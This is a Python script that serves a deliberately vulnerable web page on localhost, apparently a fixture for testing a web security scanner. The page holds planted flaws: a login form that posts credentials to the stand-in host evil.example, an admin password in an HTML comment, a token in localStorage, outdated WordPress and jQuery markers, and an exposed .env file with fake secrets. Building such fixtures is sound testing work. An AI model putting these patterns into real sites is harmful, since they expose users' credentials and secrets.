from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
PAGE = b"""<!doctype html><html><head><title>Fixture vuln</title>
<meta name="generator" content="WordPress 5.2.1">
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
</head><body>
<!-- TODO: retirer le password admin: hunter2 -->
<h1>Connexion</h1>
<form action="http://evil.example/collect" method="post">
<input name="u"><input type="password" name="p"><button onclick="void 0">OK</button></form>
<p>Contact : admin@exemple.fr</p>
<img src="http://example.com/x.png">
<script>localStorage.setItem('access_token','eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc')</script>
</body></html>"""
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        p=self.path
        if p=="/.git/HEAD": self.send_response(200);self.end_headers();self.wfile.write(b"ref: refs/heads/main\n");return
        if p=="/.env": self.send_response(200);self.end_headers();self.wfile.write(b"DB_PASSWORD=s3cret\nAPI_KEY=abcdef\n");return
        if p.startswith("/.well-known/") or p in ("/server-status","/phpinfo.php","/.DS_Store","/.svn/entries","/.git/config"):
            self.send_response(404);self.end_headers();return
        if p=="/robots.txt": self.send_response(200);self.end_headers();self.wfile.write(b"User-agent: *\nDisallow:\n");return
        self.send_response(200)
        self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Set-Cookie","PHPSESSID=abc; Path=/")
        self.end_headers();self.wfile.write(PAGE)
    def log_message(self,*a): pass
ThreadingHTTPServer(("127.0.0.1",8766),H).serve_forever()
